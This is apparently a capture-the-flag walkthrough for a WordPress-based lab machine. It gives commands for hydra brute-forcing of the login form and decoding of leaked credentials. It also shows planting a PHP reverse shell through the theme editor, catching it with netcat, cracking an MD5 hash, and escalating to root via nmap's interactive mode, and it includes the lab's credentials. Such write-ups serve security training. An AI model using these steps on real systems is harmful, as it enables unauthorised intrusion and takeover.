enumeration:
	
	nmap: 

		command: sudo nmap -sS -sV --script vuln -oN initial_scan.txt <ctf_ip>

		findings: 

			[1] From the scan it seems like WordPress is used.

			[2] 2 important pages found: /wp-login.php, /robots.txt

			[3] Found ssh port closed.

	dirsearch: 

		command: dirsearch -u http://<ctf_ip>/ -o initial_dirsearch.txt

		findings:

			[1] Found multiple pages out of following seems important.

				- /wp-login

				- /robots.txt

				- /license.txt

			[2] Found our 1st flag at '/robots' as well as we got a dictionary named 'fsocity.dic'

			[3] By visiting '/license' we found a encoded string at the end of page. This might be an password in encoded format. 

exploitation: 

	[1] Use following command to download dictionary we got in enumeration.
	Command: wget http://<ctf_url>/fsocity.dic

	[2] Got a wordlist, it means there might be chance to get credentials.

	[3] As SSH we found disabled, we will take a chance on '/wp-login'.

	[4] Start burpsuite and turn on interception. Navigate to '/wp-login' and make a test request.

	[5] Analyze the post method parameters and forward the request and carefully analyze error message.

	[6] We can observe the error message received is specific about we have entered an 'Invalid Username'. Use hydra to bruteforce username with http-post-form flag. 
	Command: hydra -L <path_to_fsocity.dic> -p test <ctf_url> http-post-form '/wp-login:log=^USER^&pwd=^PASS^: Invalid username'.

	[7] As we seen we got a valid username 'Elliot' with same technique will try to guess correct password. As a result it will take too much time till then we will try to decode the string which we got at '/license' page.
	Command: echo 'encoded_string' | base64 -d

	[8] We will get credentials: Elliot:ER28-0652.

	[9] Let's login with the credentials.

	[10] There is inbuilt code editor in the wordpress admin panel, which gives ability to modify the code of web pages. We need to navigate 'Appearance' > 'Editor'.

	[11] In the right panel we can see the web pages, we can use the 404 web page template and remove the default code and add the php reverse shell code. 

	[12] Now, start netcat listner on the port that you have mentioned in the php shell code. 
	Command: nc -lvnp 4444

	[13] Navigate to browser and try to access the url with adding your name 
	Example: http://<ctf_url>/your_name

	[14] Check out our listner, we got our shell!

	[15] After getting a shell, run following command to check username. We got a user session of 'daemon' user.
	Command: whoami

	[16] By listing out the content, it seems like we are in the root of the file system. We will navigate to the /home/ and listout the directories. We got user robot.

	[17] Navigate to directory robot and list out contents.

	[18] We got a password string encoded with raw-md5 along with our second flag. We are unable to read second flag but we can read password file.

	[19] Copy the content of password file and paste it in file on local machine by naming hash. Crack the hash with following command.
	Command: john hash --wordlist=/path_to_fsocity.dic --format=Raw-MD5 --rules

	[20] By extracting the password, we would try to switch user.
	Command: su robot

	[21] We are unable to switch to the user robot beacuse of the sessionwe got is pseudo-shell session. We need a interactive shell session inorder to switch user. We will check is python installed on the machine.
	Command: python --version

	[22] As python is installed, we will use following one liner to get an interactive shell session.
	Command: python -c 'import pty; pty.spawn("/bin/bash")'

	[23] We can read our second flag. 

	[24] Now in order to grab our third flag we need to escalate our privilege to root. To escalate the privilege we will check is there nmap installed on the machine.

	[25] We will use following command to escalate our session to root.
	Command: nmap --interactive
			 nmap>!sh

	[26] Here we successfully made it to root user.

	[27] Now, navigate to root directory and read and submit our last flag!
